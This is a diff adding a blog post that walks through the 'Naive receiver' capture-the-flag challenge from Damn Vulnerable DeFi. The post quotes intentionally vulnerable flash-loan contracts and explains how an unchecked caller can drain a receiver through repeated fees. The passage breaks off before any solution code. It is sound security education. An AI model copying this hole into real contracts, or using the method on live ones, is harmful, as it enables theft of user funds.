@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Damn Vulnerable DeFi - Challenge #2 - Naive receiver - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #2 - Naive receiver" />
+<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #2 - Naive receiver&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_02_naive-receiver/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-06T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #2 - Naive receiver"/>
+<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #2 - Naive receiver&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_02_naive-receiver/" /><link rel="prev" href="https://dellalibera.github.io/posts/evm-puzzles_solutions/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Damn Vulnerable DeFi - Challenge #2 - Naive receiver",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_02_naive-receiver\/"
+        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  1246 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_02_naive-receiver\/","datePublished": "2022-09-06T00:00:00+00:00","dateModified": "2022-09-06T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #2 - Naive receiver</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 6, 2022">September 6, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1246 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a></li>
+    <li><a href="#3-solution">3) Solution</a>
+      <ul>
+        <li><a href="#31-solution-1-multiple-transactions">3.1) Solution 1: multiple transactions</a></li>
+        <li><a href="#32-solution-2-single-transaction">3.2) Solution 2: single transaction</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-references">4) References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #2 - Naive receiver&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>There&rsquo;s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</p>
+<p>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</p>
+<p>Drain all ETH funds from the user&rsquo;s contract. Doing it in a single transaction is a big plus ;) (<a href="https://www.damnvulnerabledefi.xyz/challenges/2.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
+</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>Like in the previous <a href="/posts/damnvulnerabledefi_01_unstoppable/" rel="">challenge</a>, let&rsquo;s start by reviewing how flash loans are provided.</p>
+<p>The function responsible for offering flash loans is <code>flashLoan</code>, defined in the <code>NaiveReceiverLenderPool</code> contract (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/naive-receiver/NaiveReceiverLenderPool.sol#L21-L41" target="_blank" rel="noopener noreffer ">source code</a>):</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span></span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">NaiveReceiverLenderPool</span> <span style="color:#00f">is</span> <span style="color:#000">ReentrancyGuard</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">private</span> <span style="color:#00f">constant</span> <span style="color:#000">FIXED_FEE</span> = <span style="color:#3af">1</span> <span style="color:#00f">ether</span>; <span style="color:#888;font-style:italic">// not the cheapest flash loan
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">fixedFee</span>() <span style="color:#00f">external</span> <span style="color:#00f">pure</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">FIXED_FEE</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">address</span> <span style="color:#000">borrower</span>, <span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>) <span style="color:#00f">external</span> <span style="color:#000">nonReentrant</span> {
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">balanceBefore</span> = <span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span>;
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#000">require</span>(<span style="color:#000">balanceBefore</span> &gt;= <span style="color:#000">borrowAmount</span>, <span style="color:#5a2">&#34;Not enough ETH in pool&#34;</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#000">require</span>(<span style="color:#000">borrower</span>.<span style="color:#000">isContract</span>(), <span style="color:#5a2">&#34;Borrower must be a deployed contract&#34;</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#888;font-style:italic">// Transfer ETH and handle control to receiver
+</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">borrower</span>.<span style="color:#000">functionCallWithValue</span>(
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#000">abi</span>.<span style="color:#000">encodeWithSignature</span>(
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>                <span style="color:#5a2">&#34;receiveEther(uint256)&#34;</span>,
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>                <span style="color:#000">FIXED_FEE</span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>            ),
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#000">borrowAmount</span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        );
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#000">require</span>(
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span> &gt;= <span style="color:#000">balanceBefore</span> + <span style="color:#000">FIXED_FEE</span>,
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#5a2">&#34;Flash loan hasn&#39;t been paid back&#34;</span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        );
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Allow deposits of ETH
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#000">receive</span> () <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {}
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>The <code>flashLoan</code> function:</p>
+<ul>
+<li>prevents reentrancy by using the <code>nonReentrant</code> modifier from <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard" target="_blank" rel="noopener noreffer ">ReentrancyGuard</a></li>
+<li>checks if the ETH balance of the contract is greater or equal to the amount we want to borrow (line <code>24</code>)</li>
+<li>checks if the borrower is a contract (line <code>27</code>)</li>
+<li>calls the <code>receiveFlashLoan</code> function of the borrower contract (line <code>29</code>)</li>
+<li>checks if we paid back the loan (line <code>38</code>)</li>
+</ul>
+<p>The pool starts with <code>1000 ETH</code> (challenge <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/naive-receiver/naive-receiver.challenge.js#L21" target="_blank" rel="noopener noreffer ">setup</a>), while the <code>FlashLoanReceiver</code> contract (borrower) starts with <code>10 ETH</code> balance (challenge <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/naive-receiver/naive-receiver.challenge.js#L27" target="_blank" rel="noopener noreffer ">setup</a>).</p>
+<p>Important things to notice:</p>
+<ul>
+<li><strong>anyone can call this function</strong></li>
+<li><strong>there are no checks on the borrow amount</strong> (so it can also be <code>0</code>)</li>
+</ul>
+<p>To transfer ETH, the pool contract uses <code>functionCallWithValue</code> (line <code>29</code>) from <code>Address.sol</code> library (doc <a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-" target="_blank" rel="noopener noreffer ">here</a>). It sends the <code>borrowAmount</code> to the borrower and calls the payable <code>receiveEther(uint256)</code> function, exposed by the borrower, with <code>1 ETH</code> amount value (the fixed expensive fee).</p>
+<p>The <code>receivedEther</code> function from <code>FlashLoanReceiver</code>(<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/naive-receiver/FlashLoanReceiver.sol#L21-L32" target="_blank" rel="noopener noreffer ">source code</a>):</p>
+<ul>
+<li>checks if the sender is the pool (line <code>22</code>), so it means the pool contract can only call it</li>
+<li>computes the amount to be paid back that is the amount borrowed plus the (expensive) fee, that in this case is <code>1 ETH</code></li>
+<li>checks if the balance of the contract is greater or equal to the amount to be paid back</li>
+<li>calls <code>_executeActionDuringFlashLoan</code> (that does nothing)</li>
+<li>finally, it returns the amount borrowed plus the fees to the pool (line <code>31</code>)</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span></span><span style="background-color:#e5e5e5"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span></span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">FlashLoanReceiver</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span> <span style="color:#00f">payable</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#00f">payable</span> <span style="color:#00f">private</span> <span style="color:#000">pool</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#00f">payable</span> <span style="color:#000">poolAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">pool</span> = <span style="color:#000">poolAddress</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Function called by the pool during flash loan
+</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">receiveEther</span>(<span style="color:#00f">uint256</span> <span style="color:#000">fee</span>) <span style="color:#00f">public</span> <span style="color:#00f">payable</span> {
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#000">pool</span>, <span style="color:#5a2">&#34;Sender must be pool&#34;</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">amountToBeRepaid</span> = <span style="color:#000">msg</span>.<span style="color:#000">value</span> + <span style="color:#000">fee</span>;
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#000">require</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span> &gt;= <span style="color:#000">amountToBeRepaid</span>, <span style="color:#5a2">&#34;Cannot borrow that much&#34;</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#000">_executeActionDuringFlashLoan</span>();
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#888;font-style:italic">// Return funds to pool
+</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">pool</span>.<span style="color:#000">sendValue</span>(<span style="color:#000">amountToBeRepaid</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Internal function where the funds received are used
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">_executeActionDuringFlashLoan</span>() <span style="color:#00f">internal</span> { }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Allow deposits of ETH
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#000">receive</span> () <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {}
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>After calling <code>receiveEther</code>, the <code>borrower</code> has to pay back the flash loan plus an expensive fee of <code>1 ETH</code>.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>Who can call the <code>flashLoan</code> function ?</strong></div>
+        </div>
+    </div>
+<p>As we have seen before, <code>flashLoan</code> can be called by anyone by providing a borrower contract address that implements the <code>receiveEther</code> function.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>Who can call the <code>receiveEther</code> function of a target contract?</strong></div>
+        </div>
+    </div>
+<p>Only the pool can call <code>receiveEther</code> since there is a check at line <code>22</code>.</p>
+<p>However, by providing a borrower address, anyone can call the <code>flashLoan</code> function. It means that we (as an attacker) can indirectly call <code>receiveEther</code> of a borrower contract because <code>receiveEther</code> only checks the <code>msg.sender</code> but does not check who called <code>flashLoan</code>.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>What happens when <code>flashLoan</code> function is called ?</strong></div>
+        </div>
+    </div>
+<p>Every time the <code>flashLoan</code> function is called, the borrower has to pay <code>1 ETH</code> fee.</p>
+<p>Let&rsquo;s see an example with the following values (I&rsquo;m using the challenge code provided):</p>
+<ul>
+<li><code>borrower</code> is set to the <code>receiver.address</code></li>
+<li><code>borrowAmount</code> is set to <code>0</code> (it can be any value <code>&lt;= 1000 ETH</code>)</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
